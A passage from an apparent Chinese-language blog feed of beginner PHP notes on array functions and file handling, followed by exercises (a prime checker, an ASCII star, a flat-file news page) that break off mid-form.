class="line">$arr = [</span><br><span class="line">    &apos;name&apos; =&gt; &apos;zs&apos;,</span><br><span class="line">    &apos;age&apos;  =&gt; 18,</span><br><span class="line">    &apos;add&apos;  =&gt; &apos;China&apos;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">for($i=0; $i&lt;count($arr); $i++)&#123;</span><br><span class="line">    echo key($arr) . &apos;=&gt;&apos; . current($arr);</span><br><span class="line">    echo PHP_EOL;</span><br><span class="line">    next($arr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$arr = [</span><br><span class="line">    &apos;name&apos; =&gt; &apos;zs&apos;,</span><br><span class="line">    &apos;age&apos;  =&gt; 18,</span><br><span class="line">    &apos;add&apos;  =&gt; &apos;China&apos;</span><br><span class="line">];</span><br><span class="line">$arr1 = $arr;</span><br><span class="line">$keyName = array_keys($arr);</span><br><span class="line">$valueName = array_values($arr);</span><br><span class="line">echo $keyName[0];</span><br><span class="line">echo PHP_EOL;</span><br><span class="line">for($i=0; $i&lt;count($arr); $i++)&#123;</span><br><span class="line">    echo $keyName[$i] . &quot;=&gt;&quot; . $arr[$keyName[$i]];</span><br><span class="line">    echo PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for($i=0; $i&lt;count($arr); $i++)&#123;</span><br><span class="line">    echo array_pop($arr1);</span><br><span class="line">    next($arr1);</span><br><span class="line">    echo PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line">fwrite(STDOUT,iconv(&apos;utf-8&apos;,&apos;gb2312&apos;,&apos;使用for循环遍历关联数组&apos;));</span><br><span class="line">echo PHP_EOL;</span><br><span class="line">for($i=0; $i&lt;count($arr); $i++)&#123;</span><br><span class="line">    echo $keyName[$i] . &apos;=&gt;&apos; . $valueName[$i];</span><br><span class="line">    echo PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="2-数组常用函数"><a href="#2-数组常用函数" class="headerlink" title="2. 数组常用函数"></a>2. 数组常用函数</h4><table><thead><tr><th align="center">函数名称</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">array_keys(array, value, strict)</td><td align="center">返回数组中所有的键名</td></tr><tr><td align="center">array_values(array)</td><td align="center">返回数组中所有的值</td></tr><tr><td align="center">count(array)/sizeof(array)</td><td align="center">返回数组中元素的数目</td></tr><tr><td align="center">array_merge(array1, array2)</td><td align="center">把一个或多个数组合并为一个数组</td></tr><tr><td align="center">array_key_exists(key, array)</td><td align="center">检查指定的键名是否存在与数组中</td></tr><tr><td align="center">sort()</td><td align="center">对数值组进行升序排序</td></tr><tr><td align="center">in_array(needle, haystack)</td><td align="center">检查数组中是否存在指定的值</td></tr><tr><td align="center">array_unique()</td><td align="center">删除数组中重复的值</td></tr><tr><td align="center">array_pop(array)</td><td align="center">删除数组中最后一个元素（栈）</td></tr></tbody></table><ul><li>array_keys(array, value, strict)</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a = array(&quot;Volvo&quot; =&gt; &quot;XC90&quot;, &quot;BMW&quot; =&gt; &quot;X5&quot;, &quot;Toyota&quot; =&gt; &quot;Highlander&quot;);</span><br><span class="line">//[0]=&gt;Volvo [1]=&gt;BMW [2]=&gt;Toyota</span><br><span class="line">print_r(array_keys($a));</span><br><span class="line">//[0]=&gt;Toyota</span><br><span class="line">print_r(array_keys($a,&quot;Highlander&quot;));</span><br><span class="line"></span><br><span class="line">$a=array(10,20,30,&quot;10&quot;);</span><br><span class="line">//[0]=&gt;3</span><br><span class="line">print_r(array_keys($a,&quot;10&quot;,true));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>array_values(array)   count()/sizeof()</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a = array(&quot;Name&quot; =&gt; &quot;Peter&quot;, &quot;Age&quot; =&gt; &quot;41&quot;, &quot;Country&quot; =&gt; &quot;USA&quot;);</span><br><span class="line">//[0]=&gt;Peter [1]=&gt;41 [2]=&gt;USA</span><br><span class="line">print_r(array_values($a));</span><br><span class="line">//3</span><br><span class="line">echo count($a);</span><br><span class="line">echo PHP_EOL;</span><br><span class="line">//3</span><br><span class="line">echo sizeof($a);</span><br><span class="line">echo PHP_EOL;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>array_merge(array1, array2)</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a1 = array(&quot;a&quot; =&gt; &quot;red&quot;, &quot;b&quot; =&gt; &quot;green&quot;);</span><br><span class="line">$a2 = array(&quot;c&quot; =&gt; &quot;blue&quot;, &quot;b&quot; =&gt; &quot;yellow&quot;);</span><br><span class="line">//如果两个或更多个数组元素有相同键名，则最后元素会覆盖其他元素</span><br><span class="line">//[a]=&gt;red  [b]=&gt;yellow [c]=&gt;blue</span><br><span class="line">print_r(array_merge($a1, $a2));</span><br><span class="line"></span><br><span class="line">$a=array(3=&gt;&quot;red&quot;,4=&gt;&quot;green&quot;);</span><br><span class="line">//若数组键名是整数，则该函数将返回以键名0开始进行重新索引</span><br><span class="line">//[0]=&gt;red  [1]=&gt;green</span><br><span class="line">print_r(array_merge($a));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>array_key_exists(key, array)</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=array(&quot;Volvo&quot;=&gt;&quot;XC90&quot;,&quot;BMW&quot;=&gt;&quot;X5&quot;);</span><br><span class="line">if (array_key_exists(&quot;Volvo&quot;,$a))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;Key exists!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;Key does not exist!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a=array(&quot;Volvo&quot;,&quot;BMW&quot;);</span><br><span class="line">if (array_key_exists(0,$a))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;Key exists!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;Key does not exist!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>sort() </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);</span><br><span class="line">    sort($cars);</span><br><span class="line"></span><br><span class="line">    $clength=count($cars);</span><br><span class="line">    for($x=0;$x&lt;$clength;$x++)&#123;</span><br><span class="line">       echo $cars[$x];</span><br><span class="line">       echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    // BMW Toyota Volvo</span><br><span class="line">    $numbers=array(4,6,2,22,11);</span><br><span class="line">    sort($numbers);</span><br><span class="line"></span><br><span class="line">    $arrlength=count($numbers);</span><br><span class="line">    for($x=0;$x&lt;$arrlength;$x++)&#123;</span><br><span class="line">       echo $numbers[$x];</span><br><span class="line">       echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">//2 4 6 11 22</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>in_array() </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sites = array(&quot;Google&quot;, &quot;Runoob&quot;, &quot;Taobao&quot;, &quot;Facebook&quot;);</span><br><span class="line"> </span><br><span class="line">if (in_array(&quot;Runoob&quot;, $sites))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;找到匹配项！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;没有找到匹配项！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在练习二中<a href="https://meethanmj.github.io/2019/08/06/practice2/" target="_blank" rel="noopener">成绩输入</a>实例中也使用了in_array函数</p><ul><li>array_unique()</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=array(&quot;a&quot;=&gt;&quot;red&quot;,&quot;b&quot;=&gt;&quot;green&quot;,&quot;c&quot;=&gt;&quot;red&quot;);</span><br><span class="line">// [a]=&gt;red  [b]=&gt;green</span><br><span class="line">print_r(array_unique($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>array_pop(array)  </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=array(&quot;red&quot;,&quot;green&quot;,&quot;blue&quot;);</span><br><span class="line">array_pop($a);</span><br><span class="line">// [0]=&gt; red [1]=&gt;green</span><br><span class="line">print_r($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="二、文件处理"><a href="#二、文件处理" class="headerlink" title="二、文件处理"></a>二、文件处理</h3><h4 id="1-打开文件"><a href="#1-打开文件" class="headerlink" title="1. 打开文件"></a>1. 打开文件</h4><p><code>fopen</code>模式</p><table><thead><tr><th>模式</th><th>描述</th></tr></thead><tbody><tr><td>r</td><td>只读。在文件的开头开始。</td></tr><tr><td>r+</td><td>读/写。在文件的开头开始。</td></tr><tr><td>w</td><td>只写。打开并清空文件的内容；若文件不存在，则创建新文件。</td></tr><tr><td>w+</td><td>读/写。打开并清空文件的内容；若文件不存在，则创建新文件。</td></tr><tr><td>a</td><td>追加，若文件不存在，则创建新文件。</td></tr><tr><td>a+</td><td>读/追加。</td></tr><tr><td>x</td><td>只写。创建新文件。若文件已存在，则返回FALSE和一个错误。</td></tr><tr><td>x+</td><td>读/写，创建新文件。若文件已存在，则返回FALSE和一个错误。</td></tr></tbody></table><h4 id="2-检测文件末尾-EOF"><a href="#2-检测文件末尾-EOF" class="headerlink" title="2.检测文件末尾(EOF)"></a>2.检测文件末尾(EOF)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(feof($file))&#123;</span><br><span class="line">echo &quot;文件末尾&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-逐行-字符读取文件"><a href="#3-逐行-字符读取文件" class="headerlink" title="3. 逐行/字符读取文件"></a>3. 逐行/字符读取文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = fopen(&quot;welcome.txt&quot;, &quot;r&quot;) or exit(&quot;无法打开文件!&quot;);</span><br><span class="line">// 读取文件每一行，直到文件结尾</span><br><span class="line">while(!feof($file))</span><br><span class="line">&#123;</span><br><span class="line">    echo fgets($file). &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">fclose($file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file=fopen(&quot;welcome.txt&quot;,&quot;r&quot;) or exit(&quot;无法打开文件!&quot;);</span><br><span class="line">while (!feof($file))</span><br><span class="line">&#123;</span><br><span class="line">    echo fgetc($file);</span><br><span class="line">&#125;</span><br><span class="line">fclose($file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="4-写文件"><a href="#4-写文件" class="headerlink" title="4. 写文件"></a>4. 写文件</h4><p><code>fwrite(file, string, length)</code>和<code>fputs(file, string, length)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = fopen(&quot;test.txt&quot;,&quot;w&quot;);</span><br><span class="line">echo fwrite($file,&quot;Hello World. Testing!&quot;);</span><br><span class="line">fclose($file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = fopen(&quot;test.txt&quot;,&quot;w&quot;);</span><br><span class="line">echo fputs($file,&quot;Hello World. Testing!&quot;);</span><br><span class="line">fclose($file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>练习3</title>
      <link href="/2019/08/07/practice3/"/>
      <url>/2019/08/07/practice3/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: 学习PHP的三个练习，第一个是判断一个数是否为素数，第二个是画五角星，第三个是写一个新闻界面，用读写文件来代替数据库。</p><a id="more"></a><!--export--><p><strong>题目一</strong>：判断一个数是否为素数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;</span><br><span class="line">        判断一个数是否为素数</span><br><span class="line">    &lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;judgePrime.php&quot; method=&quot;get&quot;&gt;</span><br><span class="line">    请输入一个数：&lt;input type=&quot;text&quot; name=&quot;number&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    $num = isset($_GET[&apos;number&apos;]) ? $_GET[&apos;number&apos;]: 2;</span><br><span class="line">    $k = 0;</span><br><span class="line">    for($i=1; $i&lt;=$num; $i++)&#123;</span><br><span class="line">        if($num%$i == 0)&#123;</span><br><span class="line">            $k++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if($_GET[&apos;number&apos;]!=NULL) &#123;</span><br><span class="line">        if ($k == 2) &#123;</span><br><span class="line">            echo $num . &apos;是一个素数&apos;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo $num . &apos;不是一个素数&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>OUT</p><p><img src="/images/judgePrime.png" alt></p><p><strong>题目二</strong>：用PHP画五角星</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;\n\n&quot;;</span><br><span class="line">for ( $i1 = 1; $i1 &lt; 6; $i1++ )                    /*这是五角星的上面一个角*/</span><br><span class="line">&#123;</span><br><span class="line">    for ( $j1 = 1; $j1 &lt; 19 - $i1; $j1++ )</span><br><span class="line">        printf( &quot; &quot; );</span><br><span class="line">    for ( $k1 = 1; $k1 &lt;= 2 * $i1 - 1; $k1++ )</span><br><span class="line">        printf( &quot;*&quot; );</span><br><span class="line">    printf( &quot;\n&quot; );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for ($i2 = 1; $i2 &lt; 5; $i2++ )                    /*这是五角星的中间两个角*/</span><br><span class="line">&#123;</span><br><span class="line">    for ( $j2 = 1; $j2 &lt; 3 * $i2 - 3; $j2++ )</span><br><span class="line">        printf( &quot; &quot; );</span><br><span class="line">    for ( $k2 = 1; $k2 &lt;= 42 - 6 * $i2; $k2++ )</span><br><span class="line">        printf( &quot;*&quot; );</span><br><span class="line">    printf( &quot;\n&quot; );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for ( $i3 = 1; $i3 &lt; 3; $i3++ ) /*这是中间与下部相接的部分*/</span><br><span class="line">&#123;</span><br><span class="line">    for ( $j3 = 1; $j3 &lt; 12 - $i3; $j3++ )</span><br><span class="line">        printf( &quot; &quot; );</span><br><span class="line">    for ( $k3 = 1; $k3 &lt;= 12 + 2 * $i3; $k3++ )</span><br><span class="line">        printf( &quot;*&quot; );</span><br><span class="line">    printf( &quot;\n&quot; );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for ( $i4 = 1; $i4 &lt; 5; $i4++ ) /*这是五角星的下面两个角*/</span><br><span class="line">&#123;</span><br><span class="line">    for ( $j4 = 1; $j4 &lt; 10 - $i4; $j4++ )</span><br><span class="line">        printf( &quot; &quot; );</span><br><span class="line">    for ( $k4 = 1; $k4 &lt;= 10 - 2 * $i4; $k4++ )</span><br><span class="line">        printf( &quot;*&quot; );</span><br><span class="line">    for ( $m4 = 1; $m4 &lt; 6 * $i4 - 3; $m4++ )</span><br><span class="line">        printf( &quot; &quot; );</span><br><span class="line">    for ( $n4 = 1; $n4 &lt;= 10 - 2 * $i4; $n4++ )</span><br><span class="line">        printf( &quot;*&quot; );</span><br><span class="line">    printf( &quot;\n&quot; );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>OUT</p><p><img src="/images/fivestar.png" alt></p><p><strong>题目三</strong>：新闻界面</p><p>在<code>news_file</code>文件夹下有<code>index.php</code>和<code>data</code>文件夹，<code>index.php</code>主要是显示新闻的作用，<code>data</code>文件夹里面有<code>add_news.php</code>和<code>news.db</code>，其中<code>add_news.php</code>主要是添加新闻到<code>news.db</code>中，<code>news.db</code>每行存放着新闻的标号，标题，内容，日期，作者，热度和图片链接，其中标题，内容与作者使用了<code>base64</code>编码，两两用<code>||</code>分隔。</p><p><code>index.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;news&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1 align=&quot;center&quot;&gt;ICQ新闻中心&lt;/h1&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;table align=&quot;center&quot;&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;th&gt;热度&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;标题&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;作者&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;时间&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;素质三联&lt;/th&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        //用只读方式打开news.db文件</span><br><span class="line">        $fhandle = fopen(&quot;./data/news.db&quot;, &quot;r&quot;);</span><br><span class="line">        //设置一个计数器，小于3时，每个文章标题下面增加图片和简介</span><br><span class="line">        $top3Cnt=1;</span><br><span class="line">        while(!feof($fhandle)) &#123;</span><br><span class="line">            $fline = fgets($fhandle);</span><br><span class="line">            $data = explode(&apos;||&apos;, $fline);</span><br><span class="line">            $title = base64_decode($data[1]);</span><br><span class="line">            $content = base64_decode($data[2]);</span><br><span class="line">            $date = $data[3];</span><br><span class="line">            $author = base64_decode($data[4]);</span><br><span class="line">            $hot = $data[5];</span><br><span class="line">            $imgUrl = $data[6];</span><br><span class="line">            echo &lt;&lt;&lt;EOF</span><br><span class="line">        &lt;tr align=&quot;center&quot;&gt;</span><br><span class="line">            &lt;td&gt;$hot&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;a href=&quot;myl.php&quot;&gt;$title&lt;/a&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;$author&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;$date&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;button&gt;👍&lt;/button&gt;/&lt;button&gt;👎&lt;/button&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">EOF;</span><br><span class="line">        if($top3Cnt&lt;=3)&#123;</span><br><span class="line">            $tmpContent = mb_substr(base64_decode($data[2]), 0,50);</span><br><span class="line">            echo &lt;&lt;&lt;EOF</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;&lt;img src=&quot;$imgUrl&quot; height=&quot;80&quot; width=&quot;80&quot;&gt;&lt;/td&gt;</span><br><span class="line">                &lt;td colspan=&apos;4&apos;&gt;&lt;b&gt;内容简介：&lt;/b&gt;$tmpContent&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">EOF;</span><br><span class="line">        &#125;</span><br><span class="line">        $top3Cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>OUT</p><p><img src="/images/newshow.png" alt></p><p><code>add_news.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;增加新闻&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;add_news.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">    标号：&lt;input type=&quot;number&quot; name=&quot;id&quot;&gt;&lt;br&gt;</span><br><span class="line">    标题：&lt;input type=&quot;text&quot; name=&quot;title&quot;&gt;&lt;br&gt;</span><br><span class="line">&lt;!--    标题：&lt;input type=&quot;text&quot; namne=&quot;title&quot;&gt;&lt;br&gt;--&gt;</span><br><span class="line">    内容：&lt;input type=&quot;text&quot; 